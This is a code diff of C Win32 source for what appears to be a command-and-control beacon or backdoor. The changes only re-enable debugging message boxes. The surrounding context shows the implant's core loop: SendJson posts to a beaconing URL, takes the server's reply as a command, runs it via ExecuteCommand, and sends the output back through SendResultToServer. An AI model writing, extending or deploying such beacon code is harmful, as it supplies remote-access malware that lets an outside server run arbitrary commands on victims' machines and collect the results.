@@ -7,10 +7,10 @@ WCHAR beaconPath[MAX_PATH] = { 0 };
 WCHAR resultPath[MAX_PATH] = { 0 };
 WCHAR locationPath[MAX_PATH] = { 0 };
 VOID InitCurDir() {
-	//MessageBox(NULL, L"Get the current directory:", L"Alert", MB_OK);
+	MessageBox(NULL, L"Get the current directory:", L"Alert", MB_OK);
 	if (!GetCurrentDirectoryA(MAX_PATH, currentDirectory)) {
 		strncpy_s(currentDirectory, sizeof(currentDirectory), "C:\\", _TRUNCATE);
-		//MessageBoxA(NULL, currentDirectory, "Alert", MB_OK);
+		MessageBoxA(NULL, currentDirectory, "Alert", MB_OK);
 	}
 }
 BOOL SendJson(const char* jsonData, const WCHAR* url, const WCHAR* beaconingPath, const WCHAR* resultPath) {
@@ -76,7 +76,7 @@ BOOL SendJson(const char* jsonData, const WCHAR* url, const WCHAR* beaconingPath
 				strncat_s(cmd, sizeof(cmd), buffer, bytesRead);
 				totalBytes += bytesRead;
 			}
-			//MessageBoxA(NULL, cmd, "response", MB_OK);
+			MessageBoxA(NULL, cmd, "response", MB_OK);
 			char result[4096] = { 0 };
 			if (ExecuteCommand(cmd, result, sizeof(result))) {
 				SendResultToServer(cmd, result, url, resultPath);
@@ -201,7 +201,7 @@ BOOL SendResultToServer(const char* command, const char* result, const WCHAR* ur
 	EscapeJsonString(result, escapedResult, sizeof(escapedResult));
 	EscapeJsonString(command, escapedCommand, sizeof(escapedCommand));
 	if (strcmp(escapedResult,"") == 0) strcpy_s(escapedResult, sizeof(escapedResult), "Done!!!");;
-	//MessageBoxA(NULL, escapedResult, "caption", MB_OK);
+	MessageBoxA(NULL, escapedResult, "caption", MB_OK);
 	sprintf_s(resultJson, sizeof(resultJson), "{\"command\": \"%s\", \"result\": \"%s\"}", escapedCommand, escapedResult);
 
 	BOOL success = HttpSendRequestW(hRequest, NULL, 0, (LPVOID)resultJson, strlen(resultJson));
